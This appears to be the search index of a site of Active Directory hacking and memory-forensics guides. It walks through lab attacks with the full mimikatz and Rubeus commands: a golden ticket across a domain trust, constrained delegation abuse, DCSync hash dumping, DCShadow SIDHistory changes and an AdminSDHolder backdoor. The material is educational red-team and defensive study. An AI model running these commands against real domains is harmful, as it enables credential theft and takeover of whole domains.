{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Home Active Directory attacks explained along with guides for configuring labs for performing the attacks by Enox and d4rckh. Categories Forensics Windows & AD Hacking Authors Enox ( Twitter ) d4rckh ( Twitter ) Community We also have a small community on Discord, you can join The Red Team Lounge by clicking here","title":"Home"},{"location":"#home","text":"Active Directory attacks explained along with guides for configuring labs for performing the attacks by Enox and d4rckh.","title":"Home"},{"location":"#categories","text":"Forensics Windows & AD Hacking","title":"Categories"},{"location":"#authors","text":"Enox ( Twitter ) d4rckh ( Twitter )","title":"Authors"},{"location":"#community","text":"We also have a small community on Discord, you can join The Red Team Lounge by clicking here","title":"Community"},{"location":"Forensics/","text":"Forensics In this section you will learn about the different ways to extract juicy information from memory dumps, documents and more.","title":"Forensics"},{"location":"Forensics/#forensics","text":"In this section you will learn about the different ways to extract juicy information from memory dumps, documents and more.","title":"Forensics"},{"location":"Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/","text":"Analyzing Memory Dumps using Volatility This guide will demonstrate how to extract useful information and analyze a memory dump using volatility Volatility supports a lot of formats, here are some: Raw/Padded Physical Memory Firewire (IEEE 1394) Expert Witness (EWF) 32- and 64-bit Windows Crash Dump 32- and 64-bit Windows Hibernation (from Windows 7 or earlier) 32- and 64-bit Mach-O files Virtualbox Core Dumps VMware Saved State (.vmss) and Snapshot (.vmsn) HPAK Format (FastDump) QEMU memory dumps LiME format It also supports a lot of operating system formats! Click me to display operating system support Volatility supports investigations of the following memory images: [4] Windows: 32-bit Windows XP (Service Pack 2 and 3) 32-bit Windows 2003 Server (Service Pack 0, 1, 2) 32-bit Windows Vista (Service Pack 0, 1, 2) 32-bit Windows 2008 Server (Service Pack 1, 2) 32-bit Windows 7 (Service Pack 0, 1) 32-bit Windows 8, 8.1, and 8.1 Update 1 32-bit Windows 10 (initial support) 64-bit Windows XP (Service Pack 1 and 2) 64-bit Windows 2003 Server (Service Pack 1 and 2) 64-bit Windows Vista (Service Pack 0, 1, 2) 64-bit Windows 2008 Server (Service Pack 1 and 2) 64-bit Windows 2008 R2 Server (Service Pack 0 and 1) 64-bit Windows 7 (Service Pack 0 and 1) 64-bit Windows 8, 8.1, and 8.1 Update 1 64-bit Windows Server 2012 and 2012 R2 64-bit Windows 10 (including at least 10.0.14393) 64-bit Windows Server 2016 (including at least 10.0.14393.0) Mac OSX: 32-bit 10.5.x Leopard (the only 64-bit 10.5 is Server, which isn't supported) 32-bit 10.6.x Snow Leopard 32-bit 10.7.x Lion 64-bit 10.6.x Snow Leopard 64-bit 10.7.x Lion 64-bit 10.8.x Mountain Lion 64-bit 10.9.x Mavericks 64-bit 10.10.x Yosemite 64-bit 10.11.x El Capitan 64-bit 10.12.x Sierra 64-bit 10.13.x High Sierra 64-bit 10.14.x Mojave 64-bit 10.15.x Catalina Linux: 32-bit Linux kernels 2.6.11 to 5.5 64-bit Linux kernels 2.6.11 to 5.5 OpenSuSE, Ubuntu, Debian, CentOS, Fedora, Mandriva, etc. Source: Wikipedia The syntax of volatility is pretty simple: $ volatility -f [path to memory dump] [module to use] [...optional commands, module specific] To analyze an image with volatility, we have first to figure out the profile to use for it, we can determinate profile using a KDBG search. 1. Determining profile Determining the profile using volatility is pretty easy: $ volatility -f [path to memory dump] imageinfo The output should be something similar to this: Important: We can see from these results that volatility is suggesting us to use WinXPSP2x86 or WinXPSP3x86 profile. I know this is a Windows XP SP 3 machine, so I am going to use WinXPSP3x86. Now that we identified the profile, we can run several modules on this image. You can get a list of available modules using the -h option, there are a lot of them And that's not only everything. Let's run some modules. 2. Dumping the SAM database using Volatility The module name is named hashdump and you can run it like this: volatility_2.6_win64_standalone -f windows_xp.vmem hashdump --profile=WinXPSP3x86 . This will return the NTLM hashes (NT:LM) of the users on the machine. 3. Scanning the memory for history of commands ran You can scan commands ran on the machine using volatility, the module name is named cmdscan and you can use it like this volatility_2.6_win64_standalone -f windows_xp.vmem cmdscan --profile=WinXPSP3x86 You will get an output like this: 4. Getting a list of processes You can get a list of processes that were running on the machine using the pslist or psscan modules. psscan is more detailed, I will be using pslist in this example, you can use it like this: volatility_2.6_win64_standalone -f windows_xp.vmem psscan --profile=WinXPSP3x86 You will get an output like this: 5. Other interesting modules There are a ton of interesting modules in Volatility, here are others you can use: clipboard - dump the clipboard dlldump / dlllist - dump, respectively list loaded dlls evtlogs - extract event log (win xp / 2003 only) dumpfiles - dump cached files memdump - Dump the addressable memory for a process There are many other cool modules in volatility","title":"Analyzing Memory Dumps using Volatility"},{"location":"Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/#analyzing-memory-dumps-using-volatility","text":"This guide will demonstrate how to extract useful information and analyze a memory dump using volatility Volatility supports a lot of formats, here are some: Raw/Padded Physical Memory Firewire (IEEE 1394) Expert Witness (EWF) 32- and 64-bit Windows Crash Dump 32- and 64-bit Windows Hibernation (from Windows 7 or earlier) 32- and 64-bit Mach-O files Virtualbox Core Dumps VMware Saved State (.vmss) and Snapshot (.vmsn) HPAK Format (FastDump) QEMU memory dumps LiME format It also supports a lot of operating system formats! Click me to display operating system support Volatility supports investigations of the following memory images: [4] Windows: 32-bit Windows XP (Service Pack 2 and 3) 32-bit Windows 2003 Server (Service Pack 0, 1, 2) 32-bit Windows Vista (Service Pack 0, 1, 2) 32-bit Windows 2008 Server (Service Pack 1, 2) 32-bit Windows 7 (Service Pack 0, 1) 32-bit Windows 8, 8.1, and 8.1 Update 1 32-bit Windows 10 (initial support) 64-bit Windows XP (Service Pack 1 and 2) 64-bit Windows 2003 Server (Service Pack 1 and 2) 64-bit Windows Vista (Service Pack 0, 1, 2) 64-bit Windows 2008 Server (Service Pack 1 and 2) 64-bit Windows 2008 R2 Server (Service Pack 0 and 1) 64-bit Windows 7 (Service Pack 0 and 1) 64-bit Windows 8, 8.1, and 8.1 Update 1 64-bit Windows Server 2012 and 2012 R2 64-bit Windows 10 (including at least 10.0.14393) 64-bit Windows Server 2016 (including at least 10.0.14393.0) Mac OSX: 32-bit 10.5.x Leopard (the only 64-bit 10.5 is Server, which isn't supported) 32-bit 10.6.x Snow Leopard 32-bit 10.7.x Lion 64-bit 10.6.x Snow Leopard 64-bit 10.7.x Lion 64-bit 10.8.x Mountain Lion 64-bit 10.9.x Mavericks 64-bit 10.10.x Yosemite 64-bit 10.11.x El Capitan 64-bit 10.12.x Sierra 64-bit 10.13.x High Sierra 64-bit 10.14.x Mojave 64-bit 10.15.x Catalina Linux: 32-bit Linux kernels 2.6.11 to 5.5 64-bit Linux kernels 2.6.11 to 5.5 OpenSuSE, Ubuntu, Debian, CentOS, Fedora, Mandriva, etc. Source: Wikipedia The syntax of volatility is pretty simple: $ volatility -f [path to memory dump] [module to use] [...optional commands, module specific] To analyze an image with volatility, we have first to figure out the profile to use for it, we can determinate profile using a KDBG search.","title":"Analyzing Memory Dumps using Volatility"},{"location":"Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/#1-determining-profile","text":"Determining the profile using volatility is pretty easy: $ volatility -f [path to memory dump] imageinfo The output should be something similar to this: Important: We can see from these results that volatility is suggesting us to use WinXPSP2x86 or WinXPSP3x86 profile. I know this is a Windows XP SP 3 machine, so I am going to use WinXPSP3x86. Now that we identified the profile, we can run several modules on this image. You can get a list of available modules using the -h option, there are a lot of them And that's not only everything. Let's run some modules.","title":"1. Determining profile"},{"location":"Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/#2-dumping-the-sam-database-using-volatility","text":"The module name is named hashdump and you can run it like this: volatility_2.6_win64_standalone -f windows_xp.vmem hashdump --profile=WinXPSP3x86 . This will return the NTLM hashes (NT:LM) of the users on the machine.","title":"2. Dumping the SAM database using Volatility"},{"location":"Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/#3-scanning-the-memory-for-history-of-commands-ran","text":"You can scan commands ran on the machine using volatility, the module name is named cmdscan and you can use it like this volatility_2.6_win64_standalone -f windows_xp.vmem cmdscan --profile=WinXPSP3x86 You will get an output like this:","title":"3. Scanning the memory for history of commands ran"},{"location":"Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/#4-getting-a-list-of-processes","text":"You can get a list of processes that were running on the machine using the pslist or psscan modules. psscan is more detailed, I will be using pslist in this example, you can use it like this: volatility_2.6_win64_standalone -f windows_xp.vmem psscan --profile=WinXPSP3x86 You will get an output like this:","title":"4. Getting a list of processes"},{"location":"Forensics/Analyzing%20Memory%20Dumps%20using%20Volatility/#5-other-interesting-modules","text":"There are a ton of interesting modules in Volatility, here are others you can use: clipboard - dump the clipboard dlldump / dlllist - dump, respectively list loaded dlls evtlogs - extract event log (win xp / 2003 only) dumpfiles - dump cached files memdump - Dump the addressable memory for a process There are many other cool modules in volatility","title":"5. Other interesting modules"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/","text":"Extracting Hashes and Passwords from VMWare Memory Snapshots Requirements Mimikatz VM bin2dmp.exe / vmss2core https://flings.vmware.com/vmss2core / https://github.com/arizvisa/windows-binary-tools/blob/master/bin2dmp.exe WinDbgx64 https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk Getting a .vmem file Go to your vm in vmware workstation and take a snapshot of it This will generate few files in your vm folder client1-Snapshot3.vmem client1-Snapshot3.vmsn Getting a .dmp file Using bin2dmp.exe bin2dmp.exe client1-Snapshot3.vmem memory.dmp Using vmss2core (recommended) vmss2core-sb-8456865.exe -W8 client1-Snapshot3.vmsn client1-Snapshot3.vmem You will get a a memory.dmp file Opening the memory.dmp file in WinDbgx64 Importing mimilib.dll into WinDbgx64 Run .load c:\\path\\to\\mimilib.dll Searching for lsass.exe process in memory Type !process 0 0 lsass.exe this will search for the process and return its address Dumping passwords Let's switch to lsass.exe process context using .process /r /p <EPROCESS address> And now run !mimikatz ! Profit You will also get krbtgt hash sometimes. Other tricks: !envvar COMPUTERNAME get computer name !process 0 0x31 wininit.exe dump winit.exe !vm get a list of processes and their usage !process 0 0 list processes and their address !peb","title":"Extracting Hashes and Passwords from VMWare Memory Snapshots"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#extracting-hashes-and-passwords-from-vmware-memory-snapshots","text":"","title":"Extracting Hashes and Passwords from VMWare Memory Snapshots"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#requirements","text":"Mimikatz VM bin2dmp.exe / vmss2core https://flings.vmware.com/vmss2core / https://github.com/arizvisa/windows-binary-tools/blob/master/bin2dmp.exe WinDbgx64 https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk","title":"Requirements"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#getting-a-vmem-file","text":"Go to your vm in vmware workstation and take a snapshot of it This will generate few files in your vm folder client1-Snapshot3.vmem client1-Snapshot3.vmsn","title":"Getting a .vmem file"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#getting-a-dmp-file","text":"","title":"Getting a .dmp file"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#using-bin2dmpexe","text":"bin2dmp.exe client1-Snapshot3.vmem memory.dmp","title":"Using bin2dmp.exe"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#using-vmss2core-recommended","text":"vmss2core-sb-8456865.exe -W8 client1-Snapshot3.vmsn client1-Snapshot3.vmem You will get a a memory.dmp file","title":"Using vmss2core (recommended)"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#opening-the-memorydmp-file-in-windbgx64","text":"","title":"Opening the memory.dmp file in WinDbgx64"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#importing-mimilibdll-into-windbgx64","text":"Run .load c:\\path\\to\\mimilib.dll","title":"Importing mimilib.dll into WinDbgx64"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#searching-for-lsassexe-process-in-memory","text":"Type !process 0 0 lsass.exe this will search for the process and return its address","title":"Searching for lsass.exe process in memory"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#dumping-passwords","text":"Let's switch to lsass.exe process context using .process /r /p <EPROCESS address> And now run !mimikatz !","title":"Dumping passwords"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#profit","text":"You will also get krbtgt hash sometimes.","title":"Profit"},{"location":"Forensics/Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/#other-tricks","text":"!envvar COMPUTERNAME get computer name !process 0 0x31 wininit.exe dump winit.exe !vm get a list of processes and their usage !process 0 0 list processes and their address !peb","title":"Other tricks:"},{"location":"Forensics/How%20to%20capture%20physical%20memory%20to%20disk/","text":"How to capture physical memory to disk There are multiple methods of capturing physical memory to disk. Here are some ways to do it \ud83d\ude42 1. Using AccessData FTK Imager This is my go to for newer version of Windows (eg 10). What's FTK Imager? FTK\u00ae Imager is a data preview and imaging tool that lets you quickly assess electronic evidence to determine if further analysis with a forensic tool such as AccessData\u00ae Forensic Toolkit\u00ae (FTK) is warranted. And it's free. You can download it from here: FTK Imager version 4.3.1.1 After you download it and install it, go to File > Capture Memory This will pop up: Select the destination path and click capture memory and wait. Congrats, you just dumped the physical memory to disk! 2. DumpIt My second go to for older windows xp machines I download it from here: thimbleweed/All-In-USB This one is very easy to use. Simply double click the executable and press Y on your keyboard. **** This will be saved as a .raw file.","title":"How to capture physical memory to disk"},{"location":"Forensics/How%20to%20capture%20physical%20memory%20to%20disk/#how-to-capture-physical-memory-to-disk","text":"There are multiple methods of capturing physical memory to disk. Here are some ways to do it \ud83d\ude42","title":"How to capture physical memory to disk"},{"location":"Forensics/How%20to%20capture%20physical%20memory%20to%20disk/#1-using-accessdata-ftk-imager","text":"This is my go to for newer version of Windows (eg 10). What's FTK Imager? FTK\u00ae Imager is a data preview and imaging tool that lets you quickly assess electronic evidence to determine if further analysis with a forensic tool such as AccessData\u00ae Forensic Toolkit\u00ae (FTK) is warranted. And it's free. You can download it from here: FTK Imager version 4.3.1.1 After you download it and install it, go to File > Capture Memory This will pop up: Select the destination path and click capture memory and wait. Congrats, you just dumped the physical memory to disk!","title":"1. Using AccessData FTK Imager"},{"location":"Forensics/How%20to%20capture%20physical%20memory%20to%20disk/#2-dumpit","text":"My second go to for older windows xp machines I download it from here: thimbleweed/All-In-USB This one is very easy to use. Simply double click the executable and press Y on your keyboard. **** This will be saved as a .raw file.","title":"2. DumpIt"},{"location":"Windows%20%26%20AD%20Hacking/","text":"Windows & AD Hacking In this section you will learn about the different ways an Active Directory domain can be hacked and how you can create your own vulnerable lab.","title":"Windows & AD Hacking"},{"location":"Windows%20%26%20AD%20Hacking/#windows-ad-hacking","text":"In this section you will learn about the different ways an Active Directory domain can be hacked and how you can create your own vulnerable lab.","title":"Windows &amp; AD Hacking"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/","text":"Abusing Parent Child Domain Trusts for Privilege Escalation from DA to EA \u21d2 So we will be learning about how to abuse Child \u2194 Parent domain trusts relationship for privilege escalation from Domain Admin ( in child domain ) to Enterprise Admin in the forest. Refer to Child Domain lab Setup guide to setup the environment required for this attack \u21d2 So if we compromise a child domain and get the krbtgt hash of a child domain and the Enterpise Admin SID that is [ParentDomainSID]-519 . We can then craft a golden ticket using the info with mimikatz and get Enterprise Admin on the parent domain . If you compromise the domain controller of a child domain in a forest, you can compromise its entire parent domain. ~harmj0y Performing the Attack \u21d2 Tool Required for this attack: mimikatz PowerView \u21d2 Okay so after compromising the child domain [ child.endark.local ] we check the trusts relationship between the parent and child domain : Get-ADTrust -Filter * We see that the trust relationship is BiDirectional which basically means that members can authenticate from one domain to another when they want to access shared resources. \u21d2 Now to craft a Golden Ticket we require krbtgt hash in child domain child domain sid [ baby.endark.local ] Enterprise Admin SID \u21d2 Now lets start crafting the Golden Ticket using mimikatz .\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:baby.endark.local /sid:<Child Domain SID> /krbtgt:<krbtgt hash> /sids:<EnterpriseAdmin SID>\" \"exit\" \u21d2 Next we will load the ticket and get a shell on vDC01 in the root domain : Using Enter-PSSession : Using Invoke-Command : \u21d2 We have successfully compromised vDC01 through vDC02 by abusing the trusts relationship between child and parent domains References : http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/ Author: d4rckh and enox","title":"Abusing Parent Child Domain Trusts for Privilege Escalation from DA to EA"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/#abusing-parent-child-domain-trusts-for-privilege-escalation-from-da-to-ea","text":"\u21d2 So we will be learning about how to abuse Child \u2194 Parent domain trusts relationship for privilege escalation from Domain Admin ( in child domain ) to Enterprise Admin in the forest. Refer to Child Domain lab Setup guide to setup the environment required for this attack \u21d2 So if we compromise a child domain and get the krbtgt hash of a child domain and the Enterpise Admin SID that is [ParentDomainSID]-519 . We can then craft a golden ticket using the info with mimikatz and get Enterprise Admin on the parent domain . If you compromise the domain controller of a child domain in a forest, you can compromise its entire parent domain. ~harmj0y","title":"Abusing Parent Child Domain Trusts for Privilege Escalation from DA to EA"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/#performing-the-attack","text":"\u21d2 Tool Required for this attack: mimikatz PowerView \u21d2 Okay so after compromising the child domain [ child.endark.local ] we check the trusts relationship between the parent and child domain : Get-ADTrust -Filter * We see that the trust relationship is BiDirectional which basically means that members can authenticate from one domain to another when they want to access shared resources. \u21d2 Now to craft a Golden Ticket we require krbtgt hash in child domain child domain sid [ baby.endark.local ] Enterprise Admin SID \u21d2 Now lets start crafting the Golden Ticket using mimikatz .\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:baby.endark.local /sid:<Child Domain SID> /krbtgt:<krbtgt hash> /sids:<EnterpriseAdmin SID>\" \"exit\" \u21d2 Next we will load the ticket and get a shell on vDC01 in the root domain : Using Enter-PSSession : Using Invoke-Command : \u21d2 We have successfully compromised vDC01 through vDC02 by abusing the trusts relationship between child and parent domains References : http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/","title":"Performing the Attack"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Abusing%20Parent%20Child%20Domain%20Trusts%20for%20Privilege%20Escalation%20from%20DA%20to%20EA/#author-d4rckh-and-enox","text":"","title":"Author: d4rckh and enox"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Constrained%20Delegation%20Abuse/","text":"Constrained Delegation Abuse \u21d2 So if you have compromised a user account / system on a machine that is allowed to delegate to Domain Controller's cifs / ldap service we can abuse that to own the domain controller! Refer to the lab creation guide: Kerberos Constrained Delegation Lab Creation Explaining the Attack \u21d2 msDS-AllowedToDelegateTo : For a given computer or user account, this attribute specifies the list of service principal names (SPN) corresponding to Windows services that can act on behalf of the computer or user account. \u21d2 So here user enox is allowedtodelegate to impersonate as any user to the SPNs set as show in the screenshot [ i.e ldap and cifs ] get-netuser | ?{$_.cn -like \"naqi\"} | select msds-allowedtodelegateto -ExpandProperty msds-allowedtodelegateto So basically we can authenticate to ldap and cifs services *on *VDC01 machine as any user we want. \u21d2 S4U ( Service-For-User ) : So S4U is a set of kerberos extensions, which were implemented by Microsoft to avoid unconstrained delegations to run wild. So the s4u2fself extension allows a service to request forwardable service tickets to itself on behalf of a particular user. This was implemented so that a user authenticate to a service somewhat not using Kerberos. The extensions s4u2proxy allows the service account to use the forwardable ticket to request a service ticket to the SPN specified in msds-allowedtodelegateto. [ NOTE: This is only possible if the user has TRUSTED_TO_AUTH_FOR_DELEGATION flag set] Performing The Attack \u21d2 So to perform this attack we will be using Rubeus.exe tool which is a C# toolset for raw Kerberos interaction and abuses. It has s4u abuse extension which we can use to perform this attack Tool : https://github.com/GhostPack/Rubeus \u21d2 So as we saw previously we are allowed to delegate to : ldap cifs \u21d2 We will be showing how to abuse both of the services to compromise the domain controller. First we will start with getting rc4 hash of the user : RC4: **58A52D36C84FB7F5F1BEAB9A201DB1DD** \u21d2 cifs/vdc01.endark.local : Now we will impersonate as Administrator user and request a ticket to cifs service : ./Rubeus.exe s4u /user:Naqi /rc4:58A52D36C84FB7F5F1BEAB9A201DB1DD /impersonateuser:Administrator /domain:endark.local /msdsspn:cifs/vdc01.endark.local /ptt No winrm or mimikatz using \u201c cifs \u201d . So we will instead create a user and add it to domain admins group : Next you could just use RunAs or WinRm to the Domain Controller to get shell as the user we created and added to Domain Admins and run mimikatz to dump hashes for persistence. \u21d2 ldap/vdc01.endark.local : Impersonating as Administrator user and getting a ticket for ldap service : ./Rubeus.exe s4u /user:Naqi /rc4:58A52D36C84FB7F5F1BEAB9A201DB1DD /impersonateuser:Administrator /domain:endark.local /msdsspn:ldap/vdc01.endark.local /outfile:dc.kirbi Next we will just use the ticket with mimikatz to perform dcsync attack to dump all the hashes in the domain : .\\mimikatz.exe \"kerberos::ptt dc_ldap_vdc01.endark.local.kirbi\" \"lsadump::dcsync /all /csv\" \"exit\" References : https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/ and https://www.harmj0y.net/blog/redteaming/another-word-on-delegation","title":"Constrained Delegation Abuse"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Constrained%20Delegation%20Abuse/#constrained-delegation-abuse","text":"\u21d2 So if you have compromised a user account / system on a machine that is allowed to delegate to Domain Controller's cifs / ldap service we can abuse that to own the domain controller! Refer to the lab creation guide: Kerberos Constrained Delegation Lab Creation","title":"Constrained Delegation Abuse"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Constrained%20Delegation%20Abuse/#explaining-the-attack","text":"\u21d2 msDS-AllowedToDelegateTo : For a given computer or user account, this attribute specifies the list of service principal names (SPN) corresponding to Windows services that can act on behalf of the computer or user account. \u21d2 So here user enox is allowedtodelegate to impersonate as any user to the SPNs set as show in the screenshot [ i.e ldap and cifs ] get-netuser | ?{$_.cn -like \"naqi\"} | select msds-allowedtodelegateto -ExpandProperty msds-allowedtodelegateto So basically we can authenticate to ldap and cifs services *on *VDC01 machine as any user we want.","title":"Explaining the Attack"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Constrained%20Delegation%20Abuse/#s4u-service-for-user","text":"So S4U is a set of kerberos extensions, which were implemented by Microsoft to avoid unconstrained delegations to run wild. So the s4u2fself extension allows a service to request forwardable service tickets to itself on behalf of a particular user. This was implemented so that a user authenticate to a service somewhat not using Kerberos. The extensions s4u2proxy allows the service account to use the forwardable ticket to request a service ticket to the SPN specified in msds-allowedtodelegateto. [ NOTE: This is only possible if the user has TRUSTED_TO_AUTH_FOR_DELEGATION flag set]","title":"\u21d2 S4U ( Service-For-User ) :"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Constrained%20Delegation%20Abuse/#performing-the-attack","text":"\u21d2 So to perform this attack we will be using Rubeus.exe tool which is a C# toolset for raw Kerberos interaction and abuses. It has s4u abuse extension which we can use to perform this attack Tool : https://github.com/GhostPack/Rubeus \u21d2 So as we saw previously we are allowed to delegate to : ldap cifs \u21d2 We will be showing how to abuse both of the services to compromise the domain controller. First we will start with getting rc4 hash of the user : RC4: **58A52D36C84FB7F5F1BEAB9A201DB1DD**","title":"Performing The Attack"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Constrained%20Delegation%20Abuse/#cifsvdc01endarklocal","text":"Now we will impersonate as Administrator user and request a ticket to cifs service : ./Rubeus.exe s4u /user:Naqi /rc4:58A52D36C84FB7F5F1BEAB9A201DB1DD /impersonateuser:Administrator /domain:endark.local /msdsspn:cifs/vdc01.endark.local /ptt No winrm or mimikatz using \u201c cifs \u201d . So we will instead create a user and add it to domain admins group : Next you could just use RunAs or WinRm to the Domain Controller to get shell as the user we created and added to Domain Admins and run mimikatz to dump hashes for persistence.","title":"\u21d2 cifs/vdc01.endark.local :"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/Constrained%20Delegation%20Abuse/#ldapvdc01endarklocal","text":"Impersonating as Administrator user and getting a ticket for ldap service : ./Rubeus.exe s4u /user:Naqi /rc4:58A52D36C84FB7F5F1BEAB9A201DB1DD /impersonateuser:Administrator /domain:endark.local /msdsspn:ldap/vdc01.endark.local /outfile:dc.kirbi Next we will just use the ticket with mimikatz to perform dcsync attack to dump all the hashes in the domain : .\\mimikatz.exe \"kerberos::ptt dc_ldap_vdc01.endark.local.kirbi\" \"lsadump::dcsync /all /csv\" \"exit\" References : https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/ and https://www.harmj0y.net/blog/redteaming/another-word-on-delegation","title":"\u21d2 ldap/vdc01.endark.local :"},{"location":"Windows%20%26%20AD%20Hacking/Lab%20Attacks/DCShadow%20Attack/","text":"DCShadow Attack Explanation \u21d2 DCShadow is late-stage kill chain attack that allows an attacker with SYSTEM privilege on a machine to register as a rogue domain controller and push changes to a domain. You either need Domain Admin or the following rights to push changes to the domain : Domain Object : DS-Replication-Manage-Topology DS-Install-Replica DS-Replication-Synchronize Site Object : CreateChild DeleteChild Computer Object ( Rogue DC ) : WriteProperty Target Object : WriteProperty \u21d2 So to set these ACLs there's a powershell script named Set-DCShadowPermissions which is used to modify AD objects to provide minimal permissions required for DCShadow. \u21d2 The reason this attack is great for persistence is because there are no changelogs showed in the event viewer when we modify an object ACL which is great to hide our tracks \ud83d\ude42 . Performing The Attack Prerequisites SYSTEM on a machine Domain Admin account mimikatz Modifying an object attribute \u21d2 First lets get mimikatz fired up for the attack : [ SYSTEM ] [ Domain Administrator ] \u21d2 So next we will be modifying an user's object description attribute : [System] lsadump::dcshadow /object:test1 /attribute:Description /value=\"DCShadow works eh\" [Domain Admin] lsadump::dcshadow /push Checking the user description with PowerView to confirm we did modify user description attribute : \u21d2 Defender's perspective : Taking a look at Event Viewer in vDC01 ( Domain Controller ) to check for change logs : The only changelog here is the one showed in the screenshot, but doesn't show any logs that says we modified test1 object attribute. Although we do notice the following GUID [ E3514235\u20134B06\u201311D1-AB04\u201300C04FC2DCD2 ] in the above changelog which basically signifies that this machine is a Domain Controller : So as a defender if u see an machine being assigned the following GUID and is not in the Domain Controller Organizational Unit , it is more likely an rogue domain controller. Performing DCShadow with minimal permissions \u21d2 So in this example we won't be needing domain admin to push changes to the domain. We will be giving the minimal permissions needed using Set-DCShadowPermissions.ps1 : So we will be giving permissions to user naqi to modify test1 object from machine IIS01 Set-DCShadowPermissions -FakeDC IIS01 -SAMAccountName test1 -Username naqi -Verbose \u21d2 Firing up mimikatz as SYSTEM and Naqi : [ SYSTEM ] lsadump::dcshadow /object:test1 /attribute:Description /value=\"Noice m8\" [ NAQI ] lsadump::dcshadow /push Confirming the changes using PowerView : Setting SIDHistory \u21d2 SID History enables access for another account to effectively be cloned to another this is useful to ensure users retain access when migrating to different domain . \u21d2 We can set SIDHistory of an user account to Domain Admin / Enterprise Admin group SID which would give the user the privileges of the group we set in the SIDHistory . \u21d2 The reason this is much better than just adding a user to the group directly is : SIDHistory works for SIDs in the same domain as it does across domains in the same forest It is more sneaky and not so easy to spot as compared to modifying primaryGroupID attribute. \u21d2 We will be modifying the SIDHistory attribute for the user test1 to Enterprise Admin group SID which is : Lets get root domain SID and add -519 to it , which will be Enterprise Admins group SID : Enterprise Admins : S-1-5-21-1710056623-765944083-1957563412-519 Next lets fire up mimikatz : [ SYSTEM ] lsadump::dcshadow /object:test1 /attribute:SIDHistory /value:S-1-5-21-1710056623-765944083-1957563412-519 [ NAQI ] lsadump::dcshadow /push Confirming the changes using PowerView : AdminSDHolder \u21d2 AdminSDHolder is a container in AD that holds the Security Descriptor applied to members of protected groups. AdminSDHolder container can be abused by backdooring it by giving your user GenericAll privileges, which effectively makes that user a Domain Admin. First we will enumerate the current ACLs for AdminSDHolder (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://CN=AdminSDHolder,CN=System,DC=endark,DC=local\")).psbase.ObjectSecurity.sddl (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;<USERSID>) Now lets grab our user SID : (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1710056623-765944083-1957563412-1118) \u21d2 Next we will fire up mimikatz : \u21d2 We will be modifying the ntSecurityDescriptor attribute to add our ACL to it : [ SYSTEM ] lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=endark,DC=local /attribute:ntSecurityDescriptor 